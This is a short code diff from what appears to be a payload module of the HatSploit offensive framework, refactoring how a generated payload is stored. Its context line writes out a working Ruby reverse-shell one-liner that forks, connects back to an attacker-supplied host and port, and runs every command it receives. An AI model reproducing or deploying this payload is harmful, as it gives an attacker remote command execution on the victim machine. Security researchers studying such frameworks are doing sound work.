@@ -61,6 +61,6 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
         payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
-        self.method['Payload'] = payload
-        self.method['Instructions'] = payload
-        self.method['Type'] = 'reverse_tcp'
+        self.payload = payload
+        self.instructions = payload
+        self.action = 'reverse_tcp'
